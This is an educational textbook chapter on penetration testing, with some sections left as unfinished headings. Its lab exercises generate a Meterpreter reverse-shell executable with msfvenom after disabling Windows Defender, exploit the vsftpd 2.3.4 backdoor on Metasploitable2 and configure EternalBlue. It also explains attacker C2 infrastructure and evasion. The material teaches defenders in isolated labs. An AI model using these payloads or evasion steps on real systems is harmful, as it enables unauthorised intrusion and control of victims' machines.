# Security Testing
![](../images/10/security_tools.jpg)

Regular testing for vulnerabilities provides assurances to stakeholders that systems, networks, and applications are potentially free from security issues.  An entire subindustry has developed over the years in which organizations can hire security professionals to test the security of their systems and information.  This chapter will examine security testing processes and tools, why it is important to organization management, and how security professionals perform such tests.

**Objective**
1. Describe the types and scope of security testing processes.
2. Perform shell and reverse shell connections.
3. Understand the components of the security testing process.
4. Conduct a penetration test against Metasploitable2.
## Security Testing Fundamentals
Organizations will engage with security professionals to evaluate with degree of security misconfigurations and vulnerabilities that are reasonably discoverable in their systems.  These reviews provide management with assurances that systems are secure but often an organization's customers, owners, or regulators too demand evidence of the overall security posture of the company.  Therefore, it is common that a regularly occurring security testing process is performed in organizations that produces evidence that the activity was completed competently.
### Security Testing Types
There are several types of security testing organizations participate in.  This textbook's Information Security chapter already described one of these security testing types related to audits.  Usually internal or external security audits center around the reconciliation of observed security controls against a framework or a standard, such as policies, procedures, laws, regulations, or guidance.  They are often performed by an audit professional and not a technical security professional so the tests focus on the existence and proficiency of security controls versus the discovery of vulnerabilities and misconfigurations.

The Security Systems chapter introduced the vulnerability management process most organizations perform to ensure regular security hygiene of their systems.  This process can be performed by the organization or outsourced to an external party.  A **vulnerability assessment** is performed by a third party and typically consists of them scanning systems or networks for common misconfigurations and vulnerabilities.  They don't perform any manual testing and instead rely on the output of scanning tools to produce a report that is then made available to organization management.  The issue with vulnerability assessments is that the scanners are limited to the types of issues they can find.  They can only discover what they are programmed to do and many vulnerabilities require special attention to be identified.  

Another type of security testing is through **penetration testing**, or *pentest*, which involves the engagement of a security professional over some period of time, usually two weeks, to evaluate a system for known vulnerabilities and misconfigurations.  Sometimes these testing efforts will discover novel security issues or attack techniques as the testing process extends beyond just running a scanning tool and has the tester perform tests manually.  These engagements could include the testing of locations and buildings which is called a *physical penetration test*.  Organization customers typically expect at least an annual test conducted by a qualified third party be performed.  The tester may discover a range of security issues with a variety of severities which would be reported to the organization's management in a final report.  The organization is responsible for mitigating these issues and may re-engage the penetration tester to verify remediated issues are resolved.  Sometimes organizations perform penetration testing activities inhouse or continuously depending on their risk tolerance and security culture.

Over the last several years **bug bounty programs** have become very popular.  These programs were developed because independent security researchers were conducting unsolicited security testing of networks and applications.  Performing such tests puts the organization and the security research in jeopardy as the systems being tested to be negatively impacted and the research held legally and criminally liable.  However, many organizations began to recognize the talent in the security community and wanted to focus it in a productive manner.  Bug bounty programs involve an incentive, usually financial, for the discovery and responsible disclosure of unique security issues.  But organizations were having to build from scratch the legal and engagement processes, marketing to security researchers, scoping criteria, and many other details which became a friction to implementing a program.  In response to this problem a handful of bug bounty platforms sprang up that streamlines the setup process and registers security researchers.  This structuring of the market enabled organizations to quickly implement a program and security researchers to find new targets.  Also, by formalizing security researcher's efforts they are protected from legal prosecution while satiating their desire to perform real world engagements ad hoc.  There are several issues associated with these programs.  Popular targets often have the same issues discovered but only one bounty will be paid, leaving a large administrative burden by the organization to assess and compare all reported vulnerabilities.  Another criticism is the potential for abuse due to the financial incentive of vulnerabilities.  Imagine a developer purposefully introducing a vulnerability to have a friend report it and split the proceeds.

>[!info] Info - Beg Bounties
>Some "researchers" scan organizations targets irrespective of bug bounty program participation and then solicit, even demand, a bounty from the company.  These individuals typically find low value security issues discovered by a scanner and email the organization requesting payment.  I would caution anyone from obliging such requests as any serious researcher wouldn't request a payment or would use a legitimate bug bounty program provider. 

The last security testing type is that of a **red team** test which typically lasts several weeks or months, sometimes up to a year.  The red team test will involve a small team of highly skilled security professionals that will simulate an *advance persistent threat* and use almost any attack method, including phishing, to gain access to systems.  These engagements are often very expensive due to the timeframe and skills needed.  They are usually very successful and go unnoticed by security alerting systems.  A report is created at the end of the engagement that describes the weaknesses to access systems and information for the organization to follow up on.  The term red team, and opposite *blue team*, has its origins in the military and represents attackers (red) and defenders (blue).  Overlaying this concept on security as there are both attackers and defenders helps structure the context, type of work and systems security professionals are involved in.  Another testing activity popularized over the last several years is the concept of **purple teaming** where the red and blue teams work together in tandem to evaluate the security of a system.
### Testing Scope
Before a security test begins, especially for third party penetration tests, an agreement is formalized called the *engagement letter*.  Sometimes these agreements are governed by a *master service agreement (MSA)* that provides overarching provisions of expectations between the two parties.  It includes details surrounding the work that will be performed known as the **scope**.  This usually entails information such as the dates work will be performed, the assets that will be assessed, and other information pertaining to the agreement.  It is vital that such information is documented, agreed and adhered to as it protects the tester from liability.  Professional entities do not perform security testing without having an engagement letter executed as it would otherwise appear that they are attempting to compromise assets with malicious intent.

Prior to the preparation of the engagement letter an organization must consider whether to perform the security testing inhouse or to outsource it to a third party.  There are benefits and drawbacks between either of these methods.  An organization may not have the talent or skills to perform a comprehensive and thorough test or may have potential or perceived conflicts of interest.  An stakeholder, such as a customer, might not put much value in the attestation of internal testing as they would not be perceived as independent.  Another concern is that internal resources may already be constrained for time and allotting efforts to perform such tests put off other work that might also need to be completed known as an *opportunity cost*.  However, the value of performing inhouse testing is that the testers are highly familiar with the environment, its people, and its processes which enables them to work very efficiently.  In additional they might have the opportunity to perform tests ad hoc or to any desired duration without the consideration of costs, as their salaries are already a *sunk cost* being spent regardless of test.

Using a third party testing firm absolves stakeholder concerns for conflicts of interests as the testing firm is independent of the organization's management.  These third party firms also attract and retain high skilled security professionals that spend the majority of their time on such engagements which might qualify their expertise over inhouse personnel.  But this isn't always the case as not all security testing companies maintain high levels of expertise which an organization might not be able to fully confirm.  For instance, I once hired a firm to perform a penetration test and confirmed the qualifications of the assigned tester before testing commenced.  That individual had a number of professional certifications, a lot of experience, and was well known in the security community.  Just days before the test was to start, the testing company reassigned the vetted tester and assigned a new tester.  When I interviewed the new tester I discovered they had less than a year of professional experience and no certifications.  

Another criticism of using third party testing firms is that they are engaged for a brief period of time, usually around two weeks.  Much of this time is spent setting up and learning about the environment they are testing.  They also have to juggle multiple clients as they test due to retesting requirements as well as follow up questions post test.  There are other demands for their time and attention outside testing windows as they have to conceivably perform other duties for their firms such as staff meetings and trainings.  Given these pros and cons on inhouse versus outsourced testers, ideally a mixture of the two is performed getting the best of both and compensating for each others misgivings - if an organization can afford it.

The scope of an engagement must define what is to be tested.  That scope should define the type of assets that will be tested.  Some of the most common engagements will be centered around some number of networks, web or mobile applications, or physical locations.  In a network penetration test the tester will be provided one or more IP addresses to assess.  You could imagine these tests start with a port and service scan on each IP followed up by a version discovery and vulnerability scan.  In a web application test the engagement would define what domains or URLs are within the scope and for a mobile application test a copy of the application might be directly provide.  Physical security tests should clearly document address locations and what areas are in target.  In addition to detailing the targets, *objectives* must also be defined.  These objectives would detail the goals the tester might attempt to achieve, such as obtaining domain admin privileges, accessing a privileged page or discovering remote code execution, or accessing a server room.

>[!info] Info - Cloud Security Testing
>A subset of network tests that have become increasingly popular over the years is testing cloud environments.  These *cloud pentests* are similar to traditional network tests in concept but are tailored to cloud technologies which require an almost entirely different skillset and experience.  I highly recommend Rhino Security Labs (https://rhinosecuritylabs.com/) which has contributed to the community greatly with opensource tools and literature on cloud security testing.

Test engagements should also define the approach to the environment that is to be tested.  The approach would detail if the tests are conducted from within or outside the environment - or internal vs external to the environment.  The following diagram illustrates this concept from a network engagement, but the idea could also apply to an application or physical test.
![[../images/10/internal_external_test.png|Internal Versus External Testing|400]]
External testing as demonstrated by the attacker outside the red dotted network boundary provides the tester with only a public network to attack.  It is similar to the internet's perspective of the organization's network.  External tests are typically less resource intensive, less costly, as the number of reachable assets are limited.  However, they also only provide an outside point of view and will exclude many vulnerabilities and misconfigurations that exist within a network.  Internal testing, represented by the attacker in the hat within the red dotted lines, provides the tester with direct access to the network.  This could include a *drop box*, such as a Raspberry Pi or laptop controlled by the tester, placed within and connected to the network enabling them to reach internal resources behind the router or network firewall.

In addition to internal or external considerations, authentication must be determined prior to starting tests.  Unauthenticated tests, called *black box tests*, do not provide the tester with credentials to the networks, systems, or locations being tested.  This greatly limits the testers ability to discover issues but it does offer insights as to what an anonymous attacker could discover.  *Grey box* tests provide testers with credentials to the scoped assets giving them an insider perspective.  These tests might include low privileged, privileged, or both sets of credentials depending on the objectives of the tester.  An even more thorough scoped test is a *white box test* where any internal documentation, including but not limited to source code and network topologies, is provided to the tester.  The tester uses this information to more efficiently identify areas of weakness in the assets they are testing.  Many third party firms charge a premium for these tests as they are more laborious to execute.

> [!tip] Tip - Provide Firewall Bypass
> It is recommended to allowlist tester IP addresses in security systems like WAFs and IPSs during the testing window.  This removes obstacles that might otherwise hide the root cause of security issues or waste limited and costly time.
## Frameworks
A **framework** in the context of security testing is a toolset designed to manage the assessment of targets.  It provides the tester with a suite of tools that can identify and exploit targets but also to administer the connections from compromised endpoints.  Typically these tools can handle a high volume of compromised devices.  Once an endpoint is compromised, additional tools within the framework are available to extend post exploitation techniques including moving laterally within compromised networks.  Along the way the framework logs activity and results to support findings and generate reports.

There are many frameworks a tester can use that range from free to use to commercial paid.  Like many other security research and tools, frameworks are useful to both security professionals as well as malicious actors.  Metasploit, now owned by the company Rapid7, is one of the most popular frameworks due to is large feature set, community support, and corporate investment.  It comes pre-installed within Kali Linux operating systems and is a great introduction to the power of these frameworks.

>[!activity] Activity 10.1 - Metasploit Basics
>The Metasploit framework has verbose documentation published on https://docs.metasploit.com/ that explains the modules included within the framework and the toolset's basic usage.  Metasploit is divided into the following *modules*:
>- Auxiliary - performs tasks, such as scanning,
>- Encoder - converts data into specified encodings,
>- Evasion - tools to bypass security monitoring tools like antivirus,
>- Exploit - executes payloads that leverage vulnerabilities to achieve code execution,
>- Payload - encapsulates shellcode used within exploit modules,
>- Post - tasks for gathering, collecting or enumerating compromised endpoints
>Readers are encouraged to explore Metasploit's rich documentation that explains its architecture, basic usage, and ways to contribute.  In this activity I will demonstrate starting and navigating Metasploit before we use it again in later activities within this chapter.
>
>After starting my Kali VM and launching a terminal, I launch Metasploit using the following command.
> ```bash
> sudo msfdb run
> ```
> ![[../images/10/basics_activity_msf_start.png|Starting Metasploit Framework on Kali|600]]
> The first time launching Metasploit creates a database which is used to store testing information.  Framework users can create new databases for each engagement they are on to keep interests separate from each other.  After waiting a minute for the database to initialize we are presented with some ASCII art, that changes each time the tool is started, and the `msf6` command line known as the *console*.
> ![[../images/10/basics_activity_msf6.png|Metasploit Fully Loaded|600]]
> Metasploit is a command line tool that uses its own command prompt with built in commands.  The best command to learn first is the `help` command as it will display a description of all other commands.
> ```
> help
> ```
> ![[../images/10/basics_activity_help.png|Metasploit Help Menu|600]]
> The help menu organizes commands in sections that include Core Commands, Module commands, Job Commands, as well as a few others.  Core Commands help with administering the console and includes commands such as `set` that assigns a given value to a variable, `quit` which exits the console, and `sessions` that list all the available sessions created.  The following list from the help menu describes all available commands.
> ![[../images/10/basics_activity_core.png|Metasploit Core Commands|600]]
> The next section of the help menu is the Module Commands section.  These commands are used to find, select and navigate modules within the framework.  The `info` command describes information about a module while the `search` command can help find a module by keywords.  Other useful module commands are `use` which selects a module, `options` that displays the configuration for the module, and `back` to exit out of the module.
> ![[../images/10/basics_activity_module.png|Metasploit Module Commands|600]]
> I will demonstrate the navigation of Metasploit by searching for modules related to SMB, which is a popular Windows protocol for sharing remote services like printers and files.  Using the search command with keyword SMB, a list of all the modules in Metasploit are displayed.
> ```
> search smb
> ```
> ![[../images/10/basics_activity_search.png|Searching SMB In Metasploit]]
> The search reveals over one hundred modules with the keyword SMB in its name or description.  It produced a list of modules from auxiliary, post exploitation, and exploit categories.  I'll refine my search to identify modules related to the Eternal Blue vulnerability and exploits.  Eternal Blue was made famous through its use in WannaCry ransomware as well as the story behind its discovery being leaked by a threat actor that hacked the NSA and leaked it online.  The exploit leverages particular weaknesses in SMB to achieve remote code execution as the System user.
> ```
> search eternal
> ```
> ![[../images/10/basics_activity_eternal_search.png|Searching Eternal Blue Exploits In Metasploit|600]]
> This list of modules includes the Eternal Blue exploit I am searching for.  To select it I issue the `use` command while specifying the relative index number in the first column or the full path name of the module.
> ```
> use 0
> use exploit/windows/smb/ms17_010_eternalblue
> ```
> ![[../images/10/basics_activity_use_eternal.png|Selecting Eternal Blue Module|600]]
> Upon selecting the module the console description appends the name of the module to the command line evidencing the module is selected.  Before I configure the Eternal Blue module I need to identify what variables it needs to have set.  Running the `options` command displays each variable along with if it is required, its current value, and a brief description.
> ```
> options
> ```
> ![[../images/10/basics_activity_options.png|Eternal Blue Options|600]]
> You may have noticed between running the use and options commands that Metasploit logged a "No payload configured" message to the console and that a payload was automatically assigned.  This module requires the use of a payload module which also has settings that are displayed after running options.  The payload options LHOST and LPORT are used to instruct Metasploit where to make a reverse connection to which requires a *listener*.  We have used listeners, such as Netcat, in other chapters of this textbook but Metasploit also has the capability of setting them up.  We will explore listeners and payloads later in this chapter, but they're configuration is worth noting here.
> ![[../images/10/basics_activity_payload_options.png|Payload Options For Eternal Blue|600]]
> The Eternal Blue module needs to be instructed which asset to target.  The "R" in "RHOSTS" and "RPORT" stands for remote and is used to specify the target to attack.  I will need to set RHOSTS because it is currently blank and is required.  Running the options command again I can see RHOSTS is no longer blank!
> ```
> set RHOSTS 192.168.1.5
> options
> ```
> ![[../images/10/basics_activity_set_rhosts.png|Setting RHOSTS For Eternal Blue|600]]
> Once all required settings are configured, and a listener is setup which it currently isn't, the exploit module can be launched using the `run` or the `exploit` commands.

While Metasploit generally focuses on the compromise of targets, other frameworks are built to optimize **command and control (C2)** through the use of agents.  A free and opensource C2 framework is Covenant while a common and often abused commercial grade framework is Cobalt Strike.  This type of framework is explored in more detail within the following section.
### Command and Control
Red teamers as well as serious threat actors utilize frameworks, such as Covenant or Cobalt Strike to manage their compromised victims on server infrastructure.  In a full scale operation, these frameworks are installed on servers that the attackers remotely operate - usually frameworks under this scenario are not ran directly from an attackers workstation or laptop as they require an internet service for victims to connect to, the device may not be powerful enough to handle all of the connections, and is considered poor *operational security (opsec)* as it could directly expose their device to defenders.  The following diagram depicts the most basic of setups where multiple victims connect to the attacker's C2 infrastructure that hosts framework software.

![[../images/10/c2_basic.png|Basic C2 Infrastructure|400]]

This server organizes and manages these incoming connections enabling the attacker to remotely manage the victim's device.  The attacker logs into the C2 server, over SSH for example, and is able to send instructions to victims from the server.  Prior to the C2 server setup the attacker could register some domain to be used in attacks such as phishing.  Many security systems won't trust newly registered domains especially if they are being used for email because of the historic abuse by malicious actors.  Therefore a wise attacker will procure a domain or public IP address that has some established history and reputation, or they may attempt to build such positive reputation for a newly created domain.  These domains and their positive reputations are an important asset to the attacker that they would wish to retain.  If an IP address loses its reputation, being blocked by security tools for knowing to be malicious, the attacker can procure a new IP address and update DNS records for their domain.  The server itself may also be an important asset to the attacker as it takes time and money to setup the server.   If the victim's identify malicious activity it would be trivial to identify the public IP address or domain of the C2 server.  Often these IPs and domains make their way to opensource reputation lists that serve as feeds to many security tools such as IDS/IPS and firewalls.

To protect their infrastructure investments, scale their capabilities, and build stronger opsec, the attacker will layer their infrastructure in a manner that allows for the loss of a C2 server without causing a complete infrastructure take down.  This has the benefit of hiding additional infrastructure assets from authorities and defenders considered to be an *anti-analysis* technique.  In the following diagram the C2 server victims connect to acts as a *reverse proxy* and *load balancer* that will analyze and validate incoming requests before forwarding the requests to deeper infrastructure, such as a file server, phishing site, or framework like Cobalt Strike or Covenant.

![[../images/10/c2_advanced.png|Advanced C2 Infrastructure|500]]
The reverse proxy C2 server can validate victim traffic in a number of ways.  One such technique is to assess an HTTP header with a predefined token.  Any requests that do not include the token would be dropped as they may be deemed unsolicited, perhaps by a security defender.  Such an effort allows the attacker to evade detection or avoid their tools (malware) from being obtained by security defenders.  Should these reverse proxies be discovered, blocked or taken down by defenders it causes less impact to the attacker as rebuilding the reverse proxy C2 server is less burdensome then having to rebuild the supporting infrastructure.

Victims communicate with frameworks using an *agent* that has been installed on the victim device.  This malicious software can be classified as a *trojan* while having the unique characteristic of a resilient connection to the C2 servers.  Instead of establishing and maintaining a TCP/IP connection to the C2 server, the agent periodically reaches out to the C2 server to inspect if there are any instructions to follow.  The frequency and jitter of these connections can be randomized to avoid clear patterns that may be more easily detected by defenders.  But they all generally work the same where the agent installed on the victim device makes an outbound connection to an internet facing C2 server in order to check if there is a pending command configured by the attacker.  If there is no command the agent sleeps for some period of time before attempting again.
![[../images/10/c2_agents.png|C2 Agent Communication Flow|550]]

When the attacker is ready to have a victim or group of victims perform some task, such as a *distributed denial of service (DDoS)* attack, they log into the framework C2 and insert a command.  When the agents eventually check in, they see the command and execute it.  After the victim executes the command, the results are returned to the C2 and then the querying recommences.  In the next section we will explore shells and *reverse shells* that work similarly to agents.
## Remote Shells
The interface where a user can enter commands to a computer is often referred to as a shell, terminal, console, and command line interface although technically each of these terms have a distinguished meaning.  While it is common to use them interchangeably, as I have and will continue to in this text, it is beneficial to know their differences.  A **shell** is a computer program that provides a text only interface and is used to give the machine instructions to run other programs.  The **command line interface (CLI)**, or prompt, is part of the shell that starts with the blinking cursor where the shell user enters commands.  **Terminal** and **console** have their roots in the early days of networked computing where a device, the console, connected to a mainframe via an interface, the terminal.

> [!info] Info - Shell Options
> The most common shells for Unix and Linux operating systems are variants the *Bourne shell (sh)* command line interpreter which is often installed by default.  Other common shells that perform similarly to the Bourne shell are Bash and the Z shells (zsh).

Shells offer a convenient way to interact with a computer that has low overhead relative to a GUI.  Another feature is the ability to group commands together with logic into *scripts* which can automate tasks improving quality and efficacy.  Another profound capability of shells is that they can be used locally or remotely.  This can empower administrators and system users to connect to a device from anywhere over the internet as if they were sitting in front of it.  However, before a remote shell connection can be made, the remote device must be appropriately configured with a shell program that interacts with the networking stack.  Once the needed software and running the program runs as a service and is bound to a network port awaiting incoming connections.  

The security of remote shells is very important since it effectively turns the remote device into a server that can be connected to and controlled by anonymous users on a network.  The most basic forms of security for remote shells are authentication, such as requiring a username and password before admitting a shell connection, and encryption, where the network traffic is protected from manipulation and eavesdropping.  Advanced security measures ensure accounts making remote shell connections are authorized with least privileges even through the use of a *restricted shell* or *jail* which limit the commands that can be used.  

> [!warning] Warning - Using Non-Default Remote Management Ports for Security
> Some administrators will establish remote management ports on non-default numbers expecting the service won't be discovered.  Such efforts are trivially bypassed by a simple port scan and provide little to no real security protection.  This type of effort is called *security through obscurity* which is a technique used to hide vulnerabilities from being discovered.

A common remote shell protocol and application is Telnet which is still used today however it should be avoided.  Even though Telnet, on port 23, has authentication features built-in, it does not support encryption leaving it susceptible to MitM attacks.  Alternatively, the *secured shell (SSH)* protocol over port 22 offers enhanced authentication method, such as the use of passkeys instead of passwords, while also being secured using AES encryption.  Microsoft Windows also supports secured remote shells within over their proprietary Windows Remote Manager (WinRM) on ports 5985 and 5986 and SSH.  The following diagram depicts the most basic of SSH connections where a client establishes a remote session with a device that has a listening SSH service.

![[../images/10/shell_ssh.png|Basic SSH Connection|275]]

>[!activity] Activity 10.2 - SSH Connection
>To demonstrate SSH, I will setup the Ubuntu VM as an SSH server and then connect to it using the Kali VM which will require both VMs to be on the same network using Bridge Adapter network modes in VirtualBox.
>
>After starting the Ubuntu machine and starting a terminal, I check to see what network sockets the machine has listening.  You can think of these as being discoverable by an NMAP port scan by another device; however, using the Socket Statistics (ss) command shows the available sockets on the host machine.
>```bash
>ss -ant
>```
>![[../images/10/ssh_activity_ss.png|Socket Statistics On Ubuntu|600]]
>From the ss command I see that TCP ports 631, 53, 80, and 443 are listening.  Ports 80 and 443 are related to the Web Application Defense chapter's activities while the other ports came preconfigured when I installed Ubuntu.  Of note, port 22 for SSH is not displayed so I install OpenSSH using the following command.
>```bash
>sudo apt install openssh-server -y
>```
>![[../images/10/ssh_activity_openssh.png|Installing OpenSSH on Ubuntu|600]]
>Once OpenSSH is installed I start the SSH service and check its status which shows that the daemon is active and running without error.
>```bash
>sudo systemctl start ssh
>systemctl status ssh
>```
>![[../images/10/ssh_activity_start_ssh.png|Starting SSH Service on Ubuntu|600]]
>Checking Socket Statistics again now shows that port 22 is open to network connections!
>```bash
>ss -ant
>```
>![[../images/10/ssh_activity_ss_confirmed.png|Socket Statistics Port 22 Listening|600]]
>Before I attempt to connect to the Ubuntu VM over SSH from Kali, I will need to know its IP address which is found to be 192.168.4.169.
>```bash
>ip a
>```
>![[../images/10/ssh_activity_ip.png|Ubuntu VM's IP Address|600]]
>After starting the Kali VM, logging in, and opening a terminal, I run the preinstalled SSH client software to connect to the Ubuntu VM.  This command requires the use of sudo as it establishes a new network connection.  The command syntax for SSH is "username" at "IP address" as demonstrated in the following command.
>```bash
>sudo ssh daniel@192.168.4.169
>```
>![[../images/10/ssh_activity_connect.png|SSH Connection to Ubuntu From Kali|600]]
>After entering the command the Kali VM prompts me for the Kali `daniel` user password since I am using sudo.  Then, SSH instructs me that the Ubuntu host I'm seeking to connect to does not have a local asymmetric key associated with it and asks me if I trust the host and public key provided by Ubuntu.  I enter `yes` which adds the key to my local known_hosts file to be trusted in the future.  The next SSH session I make with Ubuntu won't prompt me again unless the keys are rotated.
>
>Once I enter yes I am prompted to provide the password for the `daniel` user on the Ubuntu VM.  I then enter the password for the user and I'm greeted with the Ubuntu terminal's message of the day and provided a command line interface!  My shell is transformed to `daniel@154-ubuntu` indicating that my terminal to the Ubuntu shell is ready for commands.
>
>I can now enter commands directly on the Ubuntu VM from my Kali VM's terminal that made the SSH connection.  The following commands demonstrates this capability.
>```bash
> whoami
> uname -a
> ip a
>```
>![[../images/10/ssh_activity_remote_commands.png|Remote Commands From Kali On Ubuntu|600]]

Hardened Network
programs that allow reverse shells
Reverse Shell
> [!activity] Activity 10.3 - Reverse Shell


## Red Team Process
Reconnaissance
Enumeration
Exploitation/Initial Access
Post Exploitation

>[!activity] Activity 10.4 - Metasploitable2

Reporting

## Exercises
>[!exercise] Exercise 10.1 - SSH
>In this task you will connect to the Ubuntu VM from the Kali VM over SSH.
>#### Step 1 - SSH Server Setup
>Start your Ubuntu VM using the Bridge Adapter network mode and launch a terminal.  Run socket statistics and observe there are no TCP sockets including port 22.
>```bash
>ss -antp
>```
>Install Open SSH on the Ubuntu VM.
>```bash
>sudo apt install openssh-server -y
>```
>Start the SSH daemon using systemctl. Once started, verify it is up and running also using systemctl.
>```bash
>sudo systemctl start ssh 
>systemctl status ssh
>```
>Use socket statistics to confirm the port 22 socket.  Check the Ubuntu VM IP address to be used to make an SSH connection from the Kali VM.
>```bash
>ip a
>```
>#### Step 2 - Establish SSH Connection
>Launch your Kali VM with Bridge Adapter network settings and launch a terminal.  Establish an SSH connection with the Ubuntu VM using the SSH client pre-installed on Kali. Make sure to replace the USER with your Ubuntu VM user and the IP with the IP address of your Ubuntu VM. Because we are using sudo with a low privilege user, enter your Kali VM user password. Type "yes" when prompted to add the Ubuntu VM IP to the known hosts. Lastly,  enter your Ubuntu VM user password when prompted.
>```bash
>sudo ssh USER@IP
>```
>After entering the Ubuntu VM password, you will be logged in and presented with the Welcome terminal message and a shell from the Kali VM.  Run `whoami` and `uname` to evidence you can run commands as the Ubuntu user on the Ubuntu VM from the Kali VM.
>```bash
>whoami
>uname -a
>```

> [!exercise] Exercise 10.2 - Reverse Shell
> In this task you will simulate a user's downloading and running of malware on the Windows VM which makes a reverse shell connection to Metasploit running on the Kali VM.
> #### Step 1 - Prepare Windows
> Launch the Windows VM in Bridge Adapter network mode and start the "Virus & threat protection" program.  With Windows Security running, select "Manage settings" under the "Virus & threat protection settings".  Turn Off the "Real-time protection", "Cloud-delivered protection", "Automatic sample submission", and "Tamper Protection" settings accepting any UAC prompts.
> #### Step 2 - Prepare Payload
> Launch your Kali VM with Bridge Adapter network setting and launch a terminal.  Check the IP address of the Kali VM.
> ```bash
> ip a
> ```
> Create an msfvenom executable file using the Kali VM's IP address as the LHOST and port 9001 as the LPORT. Use the Windows x64 staged TCP payload and output the file named runme.exe. Make sure to replace the KALI_IP with the IP address of your Kali VM.
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=9001 -f exe -o runme.exe
> ```
> #### Step 3 - Start a Web Server
> On the Kali VM, where the runme.exe file was created, start a Python webserver. Observe the webserver is standing by waiting for connections.
> ```bash
> sudo python3 -m http.server 80
> ```
> #### Step 4 - Start Meterpreter Listener
> In a new terminal on the Kali VM, start Metasploit. Note your banner message may be different.
> ```bash
> sudo msfdb run
> ```
> Navigate to the exploit multi-handler module.
> ```
> use exploit/multi/handler
> ```
> Configure the handler with the Kali VM IP address as the LHOST and port 9001 as the LPORT. Make sure to use your Kali VM IP address in place of KALI_IP.
> ```
> set LHOST KALI_IP
> set LPORT 9001
> ```
> Set the payload of the handler to the Windows x64 staged Meterpreter TCP setting we used when generating the EXE using Msfvenom.  Double check the settings and confirm the payload, LHOST, and LPORT are correct.
> ```
> options
> ```
> Start the listener. This will create a service waiting for a connection from the Meterpreter payload generated using Msfvenom.
> ```
> run
> ```
> #### Step 5 - Trigger the Attack
> The Kali VM has a Meterpreter listener on port 9001 and a webserver running on port 80. Return to the Windows VM and open a web browser. We will simulate a victim user downloading and running a malicious file from the internet. Navigate to the Kali VM's IP address and observe a listing of folders and files.
> 
> Find the "runme.exe" file in the directory listing for the Kali VM and press it to download. Edge will likely stop the download since it is an executable. Click on the toast message and select Keep from the options menu. Next SmartScreen will complain that the file isn't verified - select Show more and choose "Keep anyway". Finally, the executable downloads!
> 
> Open the Downloads folder and double-click the "runme.exe" file to launch it. SmartScreen blocks the file from running because it has the "mark of the web" setting. Select "More info" and then "Run anyway". Observe after a few seconds the Windows VM behaves normally while runme runs in the background.
> #### 6 - Profit!
> Now that the "runme.exe" ran on the Windows VM, return to the Kali VM's terminal that has the Metasploit handler/listener running. Observe that a stage was sent to the victim and a Meterpreter session was opened!
> 
> The Meterpreter shell acts like a wrapper to the Windows command line. The Meterpreter shell has many features such as download/upload, screen/keyboard recording, and much more. Type the help command to list all available features.
> ```
> help
> ```
> Explore the victim's system information using the built-in tool sysinfo. Observe the Windows system information is returned.
> ```
> sysinfo
> ```
> If your session dies, rerun the handler and re-execute the runme.exe on the victim to reestablish a connection. Using the help menu, identify a command that looks interesting and run it. Describe the command and if you were successful running it.

>[!exercise] Exercise 10.3 - Metasploitable2
>In this task you will set up a local docker container running Metasploitable2 and perform a penetration test against it. This black box scope starts at the enumeration through exploitation phases - reconnaissance and post exploitation phases are not required.
>#### Step 1 - Setup Metasploitable2
>Launch your Kali VM using the NAT network mode and start a terminal. Update your system.  Install docker which will be used to run a Metasploitable2 container.
>```bash
>sudo apt update -y
>sudo apt install -y docker.io
>```
>Add your Kali VM user to the docker group to avoid having to run as root. Afterwards, reboot your Kali VM so the permission settings take effect.
>```bash
>sudo usermod -aG docker $USER
>```
>With your Kali VM rebooted, run the Metasploitable2 docker image as name "metasploitable2", which will cause it to download automatically and start the services. The "&" ampersand at the end of the command makes the command run in the background of the terminal. Please allow a couple minutes for the container to download, run, and start services.
>```bash
>docker run -it --name "metasploitable2" tleemcjr/metasploitable2 sh -c "bin/services.sh && bash" &
>```
>Confirm the Metasploitable2 container is running. Observe the status is "Up".
>```bash
>docker container ls
>```
>#### Step 2 - Host Discovery
>The Metasploitable2 container is our target victim that is running off our Kali VM's virtual docker interface. Identify the docker virtual interface network using the ip command. Observe the docker0 interface with the network 172.17.0.1/16
>```bash
>ip a
>```
>Perform a ping sweep to discover all hosts running on the docker0 network. Make sure to replace the network CIDR range if yours is different. Within a few seconds the ping sweep discovers a host on 172.17.0.2 (yours may be different). Once the host is discovered, press CTRL+C to stop the scan. Otherwise, you'll have to wait several minutes for the scan to complete this /16 network.
>```bash
>sudo nmap -sn 172.17.0.1/16
>```
>#### Step 3 - Service Discovery
>Perform a TCP port and service scan against the identified target. Make sure to replace the IP with the identified metasploitable2 container IP discovered in the previous sub-step. Allow a few minutes for the scan to complete.
>```bash
>sudo nmap -sT -sV IP
>```
>Observe the target has several services open and that NMAP discovered versions of some of the identified services.
>#### Step 4 - Exploitation
>The NMAP service and version discovery yielded several results. One result of particular interest is port 21 FTP service using vsftpd on version 2.3.4. Start Metasploit on your Kali VM - your ASCII art may vary.
>```bash
>sudo msfdb run
>```
>With Metasploit running, search for vsftpd exploits. Observe that Metasploit has an exploit for VSFTPD version 2.3.4 which matches Metasploitable2's running version!
>```
>search vsftpd
>```
>Select the vsftpd_234_backdoor exploit in Metasploit.
>```
>use exploit/unix/ftp/vsftpd_234_backdoor
>```
>Explore the required configurations needed with the options command.
>```
>options
>```
>Configure the RHOSTS (remote) option with the IP address of the metasploitable2 container. Make sure to replace VICTIM_IP with the IP address of metasploitable2.
>```
>set RHOSTS VICTIM_IP
>```
>After RHOSTS is set, run the exploit. The first time the exploit ran it failed. Rerunning it worked better a second time. Sometimes exploits can be a little finicky!
>```
>run
>```
>After the exploit runs the cursor is on a blank line. Run OS commands to confirm the reverse shell is working.
>```bash
>whoami
>uname -a
>ip a
>```
>If needed, run sessions and sessions # to identify and use a running session.
>```
>sessions
>sessions 1
>```
>If you are in the shell, and want to return to Metasploit, run the background command and "y".
>```
>background
>```

>[!exercise] Exercise 10.4 - Penetration Test
>In this task, you will build on your penetration test from the previous task.  You MUST find two additional vulnerabilities and attempt to exploit them.  Regardless of success, you must document the VSFTPD vulnerabilities AND the two vulnerabilities you identify in a penetration report.  You may use any general format for the report, but it MUST include a background, summary, and findings sections.  Each finding in the report MUST include a description, severity/impact, proof of concept/demonstration, and remediation recommendations.  Consider referencing a sample from [https://github.com/juliocesarfort/public-pentesting-reports](https://github.com/juliocesarfort/public-pentesting-reports) to guide the format of your professional report.